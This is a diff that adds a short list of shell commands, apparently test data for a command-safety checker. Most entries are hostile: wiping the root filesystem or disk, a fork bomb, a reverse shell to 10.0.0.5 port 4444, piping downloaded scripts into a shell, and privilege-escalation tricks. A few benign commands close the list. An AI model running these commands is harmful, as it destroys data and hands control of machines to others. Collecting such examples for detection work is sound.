@@ -1,0 +1,26 @@
+rm -rf /
+sudo rm -rf /
+rm -rf /etc
+rm -rf --no-preserve-root /
+find / -delete
+rm -rf *
+rm -rf ~
+:(){ :|:& };:
+mkfs.ext4 /dev/sda
+dd if=/dev/zero of=/dev/sda bs=4M
+bash -i >& /dev/tcp/10.0.0.5/4444 0>&1
+curl http://example.com/i.sh | bash
+wget -qO- http://example.com/x | sh
+echo 'a2FsbA==' | base64 -d | bash
+chmod 4755 /tmp/x
+chmod -R 777 /var/www
+chmod 777 /etc/passwd
+export LD_PRELOAD=/tmp/lib.so
+eval "$PAYLOAD"
+tar --checkpoint-action=exec=/bin/sh
+ls -la
+git status
+cat /etc/os-release
+sudo apt update
+python3 app.py
+docker compose up -d
